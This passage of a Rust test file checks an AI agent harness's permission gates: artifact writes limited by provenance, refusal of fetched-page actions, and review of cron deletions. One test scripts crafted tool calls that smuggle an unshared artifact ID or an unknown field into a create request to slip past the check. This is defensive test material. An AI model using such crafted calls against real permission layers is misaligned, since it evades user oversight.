        persistent: false,
    });
    let agent = fetching_harness(model, host_rules);
    let chat = agent.create_chat_without_folder().await.unwrap();
    agent
        .set_search(
            chat,
            Some(tickloop_agent_protocol::SearchConfig {
                provider: tickloop_agent_protocol::SearchProviderKind::Searxng,
                endpoint: format!("{search}/search"),
                api_key_env: None,
            }),
        )
        .await
        .unwrap();
    let results = run_fetches(&agent, chat, "Search for the delivery page.", 2).await;
    assert!(!results[0].1, "{:?}", results[0]);
    assert!(is_refused_for_provenance(&results[1]), "{:?}", results[1]);
    agent.shutdown().await;
}

const NAMED_ARTIFACT: &str = "quarterly-report";
const UNSHARED_ARTIFACT: &str = "someone-elses-plan";

/// Makes each Artifact call in turn, one per step, then finishes.
fn artifact_model(calls: Vec<(&'static str, &'static str, Value)>) -> Arc<RoutedModel> {
    Arc::new(RoutedModel::new(move |request| {
        for (id, name, input) in &calls {
            if !has_tool_result(request, id) {
                return call(id, name, input.clone());
            }
        }
        text("Done.")
    }))
}

fn patch(artifact: &str) -> Value {
    json!({"action": "patch", "artifact_id": artifact, "patches": [{"type": "replace", "target": "b1", "expected_hash": "h1", "text": "# Updated"}]})
}

fn reply(artifact: &str) -> Value {
    json!({"action": "reply", "artifact_id": artifact, "thread_id": "thread-1", "text": "Done"})
}

/// The text and error flag of the result of call `id`.
fn call_result(snapshot: &tickloop_agent_protocol::ChatSnapshot, id: &str) -> (String, bool) {
    snapshot
        .messages
        .iter()
        .flat_map(|message| &message.content)
        .find_map(|content| match content {
            Content::ToolResult {
                tool_use_id,
                content,
                is_error,
            } if tool_use_id == id => Some((content.text().into_owned(), *is_error)),
            _ => None,
        })
        .unwrap_or_else(|| panic!("{id} has a result"))
}

fn is_refused_for_artifact_provenance((text, is_error): &(String, bool)) -> bool {
    *is_error && text.contains("Ask the user to share the Artifact's link")
}

async fn artifact_agent(
    service: &ArtifactService,
    store: Arc<InMemoryTranscriptStore>,
    model: Arc<RoutedModel>,
) -> (Agent, tempfile::TempDir) {
    let credentials = tempfile::tempdir().unwrap();
    let account = service.login(credentials.path()).await;
    let agent = cloud_harness(store, model, cloud_options(durable_chat_host_rules()));
    agent
        .install_host_tools(Arc::new(McpHostToolProvider::new(account, None)))
        .unwrap();
    (agent, credentials)
}

async fn settle_turn(agent: &Agent, chat: ChatId, text: &str) {
    let request = prompt(text);
    agent.advance(chat, request.clone()).await.unwrap();
    assert!(matches!(
        tokio::time::timeout(WAIT, agent.settled_input(chat, request.input_id))
            .await
            .unwrap()
            .unwrap(),
        SettledOutcome::Completed { .. }
    ));
}

/// Artifact writes skip review for an Artifact the user named or the conversation created, and
/// are refused for any other, before reaching the service; after a handover the created Artifact
/// is still the conversation's.
#[tokio::test]
async fn artifact_writes_reach_only_artifacts_the_user_named_or_the_conversation_created() {
    let service = ArtifactService::start().await;
    let store = Arc::new(InMemoryTranscriptStore::new());
    let (first, _credentials) = artifact_agent(
        &service,
        store.clone(),
        artifact_model(vec![
            ("named", "ArtifactEdit", patch(NAMED_ARTIFACT)),
            ("unshared", "ArtifactComment", reply(UNSHARED_ARTIFACT)),
            (
                "create",
                "ArtifactEdit",
                json!({"action": "create", "title": "Notes", "format": "doc", "content": "# Notes"}),
            ),
            ("created", "ArtifactEdit", patch(CREATED_ARTIFACT)),
        ]),
    )
    .await;
    let admissions = watch_admissions(&first);
    let chat = first.create_chat_without_folder().await.unwrap();
    settle_turn(
        &first,
        chat,
        &format!("Update {NAMED_ARTIFACT} and keep notes in a new doc."),
    )
    .await;
    let snapshot = first.snapshot(chat).await.unwrap();
    for id in ["named", "create", "created"] {
        assert!(
            !call_result(&snapshot, id).1,
            "{id}: {:?}",
            call_result(&snapshot, id)
        );
    }
    assert!(is_refused_for_artifact_provenance(&call_result(
        &snapshot, "unshared"
    )));
    assert!(
        admissions.lock().unwrap().is_empty(),
        "{:?}",
        admissions.lock().unwrap()
    );
    let reached = service
        .tool_calls()
        .iter()
        .map(|call| call["arguments"]["artifact_id"].as_str().map(str::to_owned))
        .collect::<Vec<_>>();
    assert_eq!(
        reached,
        [
            Some(NAMED_ARTIFACT.into()),
            None,
            Some(CREATED_ARTIFACT.into())
        ]
    );
    first.shutdown().await;
    first.sync().await.unwrap();

    let (next, _credentials) = artifact_agent(
        &service,
        store,
        artifact_model(vec![
            ("again", "ArtifactComment", reply(CREATED_ARTIFACT)),
            ("unshared-again", "ArtifactEdit", patch(UNSHARED_ARTIFACT)),
        ]),
    )
    .await;
    next.resume_chat(chat).await.unwrap();
    settle_turn(&next, chat, "Leave a note on the notes doc.").await;
    let snapshot = next.snapshot(chat).await.unwrap();
    assert!(
        !call_result(&snapshot, "again").1,
        "{:?}",
        call_result(&snapshot, "again")
    );
    assert!(is_refused_for_artifact_provenance(&call_result(
        &snapshot,
        "unshared-again"
    )));
    next.shutdown().await;
}

/// An Artifact the user shared through the host may be written to without review.
#[tokio::test]
async fn an_artifact_the_user_shared_through_the_host_may_be_written() {
    let service = ArtifactService::start().await;
    let (agent, _credentials) = artifact_agent(
        &service,
        Arc::new(InMemoryTranscriptStore::new()),
        artifact_model(vec![(
            "shared",
            "ArtifactComment",
            reply(UNSHARED_ARTIFACT),
        )]),
    )
    .await;
    let chat = agent.create_chat_without_folder().await.unwrap();
    agent.share_artifact(chat, UNSHARED_ARTIFACT).await.unwrap();
    settle_turn(&agent, chat, "Reply on the shared plan.").await;
    let snapshot = agent.snapshot(chat).await.unwrap();
    assert!(
        !call_result(&snapshot, "shared").1,
        "{:?}",
        call_result(&snapshot, "shared")
    );
    agent.shutdown().await;
}

/// A crafted call cannot borrow a create's admission: a create that also addresses an existing
/// Artifact, or carries a field the host does not know, is refused before the service, and a
/// plain create still goes through. (Copying from a source Artifact is checked like a target;
/// the recorded service directory has no such field, so the unit tests cover it.)
#[tokio::test]
async fn a_create_cannot_carry_an_artifact_without_provenance() {
    let service = ArtifactService::start().await;
    let create = |extra: Value| {
        let mut input =
            json!({"action": "create", "title": "Notes", "format": "doc", "content": "# Notes"});
        input
            .as_object_mut()
            .unwrap()
            .extend(extra.as_object().unwrap().clone());
        input
    };
    let (agent, _credentials) = artifact_agent(
        &service,
        Arc::new(InMemoryTranscriptStore::new()),
        artifact_model(vec![
            (
                "addresses",
                "ArtifactEdit",
                create(json!({"artifact_id": UNSHARED_ARTIFACT})),
            ),
            (
                "unknown",
                "ArtifactEdit",
                create(json!({"copy_from": UNSHARED_ARTIFACT})),
            ),
            ("plain", "ArtifactEdit", create(json!({}))),
        ]),
    )
    .await;
    let chat = agent.create_chat_without_folder().await.unwrap();
    settle_turn(&agent, chat, "Keep notes.").await;
    let snapshot = agent.snapshot(chat).await.unwrap();
    let (text, is_error) = call_result(&snapshot, "addresses");
    assert!(is_error && text.contains("cannot admit"), "{text}");
    assert!(call_result(&snapshot, "unknown").1);
    assert!(
        !call_result(&snapshot, "plain").1,
        "{:?}",
        call_result(&snapshot, "plain")
    );
    assert_eq!(
        service.tool_calls().len(),
        1,
        "only the plain create was sent"
    );
    agent.shutdown().await;
}

/// The host's rules let CronCreate through, since the Agent's task waits for the user to confirm
/// it, but not CronDelete: with no reviewer and no person in a cloud Chat, the deletion is
/// refused and the task stays.
#[tokio::test]
async fn deleting_a_scheduled_task_is_reviewed_under_the_cloud_composition() {
    let model = Arc::new(tickloop_agent_test_support::ScriptedModel::new(vec![
        call(
            "schedule",
            "CronCreate",
            json!({"cron": "7 9 * * *", "prompt": "Check the delivery page."}),
        ),
        text("Scheduled."),
    ]));
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        model.clone(),
        cloud_options(durable_chat_host_rules()),
    );
    let admissions = watch_admissions(&agent);
    let root = agent.create_chat_without_folder().await.unwrap();
    let request = prompt("Check the delivery every morning.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    let task = agent
        .snapshot(root)
        .await
        .unwrap()
        .scheduled_tasks
        .remove(0);
    assert!(
        admissions.lock().unwrap().is_empty(),
        "CronCreate is the host's"
    );

    model.enqueue(call("unschedule", "CronDelete", json!({"id": task.id})));
    model.enqueue(text("Done."));
    let request = prompt("Stop checking.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    assert!(
        admissions
            .lock()
            .unwrap()
            .iter()
            .any(|seen| seen.starts_with("assessed")),
        "CronDelete went to review: {:?}",
        admissions.lock().unwrap()
    );
    assert_eq!(
        agent.snapshot(root).await.unwrap().scheduled_tasks,
        [task],
        "the refused deletion left the task"
    );
    agent.shutdown().await;
}
